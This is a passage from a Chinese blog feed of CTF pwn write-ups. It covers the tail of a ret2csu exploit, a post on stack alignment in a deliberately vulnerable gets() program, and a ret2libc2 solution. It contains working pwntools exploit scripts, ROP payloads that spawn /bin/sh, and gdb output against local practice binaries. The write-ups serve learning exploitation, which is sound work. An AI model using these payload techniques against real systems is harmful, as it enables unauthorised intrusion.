operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>蒸米原文：<br>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Started program <span class="token string">'./level5'</span>got_write: 0x601000got_read: 0x601008off_system_addr: 0xa1c40<span class="token comment" spellcheck="true">#############sending payload1#############</span>write_addr: 0x7f79d5779370system_addr: 0x7f79d56d7730<span class="token comment" spellcheck="true">#############sending payload2#############</span><span class="token comment" spellcheck="true">#############sending payload3#############</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span>mzheng</code></pre><h2 id="5：总结"><a href="#5：总结" class="headerlink" title="5：总结"></a>5：总结</h2><p><strong><em>原来pwn的艺术不是explosion，而是gadgets链构造，这种艺术我等凡人无法欣赏</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>偶遇栈平衡</title>
      <link href="/2020/07/08/ou-yu-zhan-ping-heng/"/>
      <url>/2020/07/08/ou-yu-zhan-ping-heng/</url>
      
        <content type="html"><![CDATA[<h2 id="1：我自己写的一个简单程序"><a href="#1：我自己写的一个简单程序" class="headerlink" title="1：我自己写的一个简单程序"></a>1：我自己写的一个简单程序</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出漏洞显而易见</p><h2 id="2：checksec"><a href="#2：checksec" class="headerlink" title="2：checksec"></a>2：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/buu-pwn$ checksec <span class="token function">test</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/buu-pwn/test'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位常规操作</p><h2 id="3：IDA"><a href="#3：IDA" class="headerlink" title="3：IDA"></a>3：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>有个backdoor函数<span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="4：gdb溢出点72"><a href="#4：gdb溢出点72" class="headerlink" title="4：gdb溢出点72"></a>4：gdb溢出点72</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>main+44<span class="token operator">></span>:    call   0x400460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>main+49<span class="token operator">></span>:    mov    eax,0x0   0x4005ad <span class="token operator">&lt;</span>main+54<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005ae <span class="token operator">&lt;</span>main+55<span class="token operator">></span>:    ret       0x4005af <span class="token operator">&lt;</span>backdoor<span class="token operator">></span>:    push   rbp   0x4005b0 <span class="token operator">&lt;</span>backdoor+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005b3 <span class="token operator">&lt;</span>backdoor+4<span class="token operator">></span>:    lea    rdi,<span class="token punctuation">[</span>rip+0x9f<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x400659</span>   0x4005ba <span class="token operator">&lt;</span>backdoor+11<span class="token operator">></span>:    call   0x400470 <span class="token operator">&lt;</span>system@plt<span class="token operator">></span><span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde88 <span class="token punctuation">(</span><span class="token string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffde90 <span class="token punctuation">(</span><span class="token string">"AJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x4c414136 <span class="token punctuation">(</span><span class="token string">'6AAL'</span><span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x400577 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x0 0048<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0xb7de885b3d5ed61a 0056<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x00000000004005ae <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ pattern offset AAdAA3AAdAA3 found at offset: 64gdb-peda$ pattern offset IAAeAIAAeA found at offset: 72gdb-peda$ </code></pre><p>感觉没啥问题</p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使程序跳转到backdoor函数即可</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span>   p64<span class="token punctuation">(</span><span class="token number">0x04005af</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="6：执行情况（gdb调试）"><a href="#6：执行情况（gdb调试）" class="headerlink" title="6：执行情况（gdb调试）"></a>6：执行情况（gdb调试）</h2><pre class=" language-bash"><code class="language-bash">RDI: 0x2 RBP: 0x7fffffffdd88 --<span class="token operator">></span> 0x0 RSP: 0x7fffffffdd28 --<span class="token operator">></span> 0x0 RIP: 0x7ffff7a332f6 <span class="token punctuation">(</span><span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd1600 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x0 R10: 0x8 R11: 0x246 R12: 0x400659 <span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span>R13: 0x7fffffffdfa0 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x7ffff7a332e6 <span class="token operator">&lt;</span>do_system+1078<span class="token operator">></span>:    movq   xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>   0x7ffff7a332ec <span class="token operator">&lt;</span>do_system+1084<span class="token operator">></span>:    mov    QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>,rax   0x7ffff7a332f1 <span class="token operator">&lt;</span>do_system+1089<span class="token operator">></span>:    movhps xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x7ffff7a332f6 <span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0     <span class="token comment" spellcheck="true">#程序到这里死活不能动</span>   0x7ffff7a332fb <span class="token operator">&lt;</span>do_system+1099<span class="token operator">></span>:    call   0x7ffff7a23110 <span class="token operator">&lt;</span>__GI___sigaction<span class="token operator">></span>   0x7ffff7a33300 <span class="token operator">&lt;</span>do_system+1104<span class="token operator">></span>:    lea    rsi,<span class="token punctuation">[</span>rip+0x39e2f9<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x7ffff7dd1600 &lt;quit></span>   0x7ffff7a33307 <span class="token operator">&lt;</span>do_system+1111<span class="token operator">></span>:    xor    edx,edx   0x7ffff7a33309 <span class="token operator">&lt;</span>do_system+1113<span class="token operator">></span>:    mov    edi,0x3<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdd28 --<span class="token operator">></span> 0x0 0008<span class="token operator">|</span> 0x7fffffffdd30 --<span class="token operator">></span> 0x7ffff7b97e97 --<span class="token operator">></span> 0x2f6e69622f00632d <span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffdd38 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0x7fffffffdd40 --<span class="token operator">></span> 0x1 0032<span class="token operator">|</span> 0x7fffffffdd48 --<span class="token operator">></span> 0x7ffff7a33360 <span class="token punctuation">(</span><span class="token operator">&lt;</span>cancel_handler<span class="token operator">></span>:    push   rbx<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdd50 --<span class="token operator">></span> 0x7fffffffdd44 --<span class="token operator">></span> 0xf7a3336000000000 0048<span class="token operator">|</span> 0x7fffffffdd58 --<span class="token operator">></span> 0x0 0056<span class="token operator">|</span> 0x7fffffffdd60 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00007ffff7a332f6 <span class="token keyword">in</span> do_system <span class="token punctuation">(</span>line<span class="token operator">=</span>0x400659 <span class="token string">"cat test.py"</span><span class="token punctuation">)</span> at <span class="token punctuation">..</span>/sysdeps/posix/system.c:125125    <span class="token punctuation">..</span>/sysdeps/posix/system.c: 没有那个文件或目录.gdb-peda$ </code></pre><h2 id="7：原因"><a href="#7：原因" class="headerlink" title="7：原因"></a>7：原因</h2><p><strong>向大佬求助得知，奈何涉及堆栈平衡，适时吾甚愚昧不知所云，只可将0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0指令铭记于心，付以esp寄存器需需结尾为0</strong><br><strong>若想根治则反复使用pop  ， ret指令平衡参数或跳转。以及自制代码buf莫要随意限其大小，常见128，512甚好（8的整数倍）</strong></p><h3 id="修改利用ret指令"><a href="#修改利用ret指令" class="headerlink" title="修改利用ret指令"></a>修改利用ret指令</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xd3 bytes:    <span class="token string">'from pwn import*\n'</span>    <span class="token string">"context.log_level = 'debug'\n"</span>    <span class="token string">'\n'</span>    <span class="token string">"sh = process('./test')\n"</span>    <span class="token string">'sh.recv()\n'</span>    <span class="token string">'#0x000000000040044e : ret\n'</span>    <span class="token string">"payload = 'A'*72 + p64(0x040044e) +  p64(0x04005af)\n"</span>    <span class="token string">'gdb.attach(sh)\n'</span>    <span class="token string">'sh.sendline(payload)\n'</span>    <span class="token string">'\n'</span>    <span class="token string">'sh.interactive()\n'</span>from pwn import*context.log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh.recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'A'</span>*72 + p64<span class="token punctuation">(</span>0x040044e<span class="token punctuation">)</span> +  p64<span class="token punctuation">(</span>0x04005af<span class="token punctuation">)</span>gdb.attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p><strong>所以以后能跳转到system函数时出错看看是不是这个原因</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-ret2libc2</title>
      <link href="/2020/07/06/wiki-ret2libc2/"/>
      <url>/2020/07/06/wiki-ret2libc2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/ret2libc2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>又是只有NX开启的常规操作</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something surprise here, but I don't think it will work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>显然gets这里有栈溢出，用IDA检查字符串发现有system函数，但是没有/bin/sh字符串</strong></p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x80486c5 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x80486ba <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048460 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x80486bf <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x80486c4 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x80486c5 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x80486c6:    xchg   ax,ax   0x80486c8:    xchg   ax,ax   0x80486ca:    xchg   ax,ax   0x80486cc:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd040 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd044 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd048 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x080486c5    30    <span class="token keyword">in</span> ret2libc.cgdb-peda$ pattern offset AA8AAA8A found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><p><strong>首先因为在程序中可以直接利用system函数，还有栈溢出跳转到system函数，接下来就是想办法得到/bin/sh字符串。</strong><br><strong>一般的如果题目没有给libc文件不老要想着找到libc地址来解题。那么不考虑libc文件中的/bin/sh字符串，我们看能不能利用输入来获得该字符串。</strong><br><strong>仔细看IDA主函数的伪代码会发现有个函数将bss段清零了（当然bss一般本来就是0）这应该就是给我们提示了，利用bss段全局变量来存放我们输入的/bin/sh，这样就可以让system函数利用这个字符串。那么输入函数这里直接有gets函数。ok构造exp</strong></p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ret2libc2'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804A040</span>   <span class="token comment" spellcheck="true">#bss段的地址都可以在IDA找到</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del><br>**</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-string</title>
      <link href="/2020/07/04/xctf-string/"/>
      <url>/2020/07/04/xctf-string/</url>
      
